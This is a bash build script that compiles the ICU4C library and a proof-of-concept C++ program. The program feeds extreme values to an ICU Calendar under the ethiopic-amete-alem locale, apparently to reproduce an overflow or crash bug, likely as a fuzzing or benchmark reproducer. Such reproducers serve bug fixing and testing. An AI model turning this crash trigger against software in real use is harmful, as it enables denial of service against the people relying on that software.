#!/bin/bash -eu
./icu4c/source/runConfigureICU Linux --prefix="$PWD/install" --enable-shared --enable-static --enable-debug
make -j32
make install

cat <<EOF > poc.cpp
#include "unicode/calendar.h"
#include "unicode/timezone.h"
#include "unicode/locid.h"
#include "unicode/utypes.h"
#include <iostream>
#include <cstdlib>

using namespace icu;


int main() {
    Locale locale("ckb_IQ@calendar=ethiopic-amete-alem");
    UErrorCode status = U_ZERO_ERROR;
    LocalPointer<Calendar> cal(Calendar::createInstance(
            *TimeZone::getGMT(), locale, status));
    cal->clear();
    status = U_ZERO_ERROR;
    cal->fieldDifference(
        (double)115177509667085876226560460721710683457425563915331054206329829993967720136006086546037257220523631494518538798239249720325557586193565921621016454170342731307548672.0,
        UCAL_MONTH, status);
    status = U_ZERO_ERROR;
    cal->set(UCAL_DAY_OF_WEEK_IN_MONTH , -2111799174);
    cal->add(UCAL_ERA, -1426056846, status);
    if (U_FAILURE(status)) {
        std::cout << "Should return failure" << std::endl;
    }

    return 0;
}
EOF

if [ ! -z "${CXX:-}" ]; then
    ${CXX} ${CXXFLAGS} -I install/include -L install/lib -l icuuc -l icui18n -l icudata -Wl,-rpath,install/lib -o poc poc.cpp
fi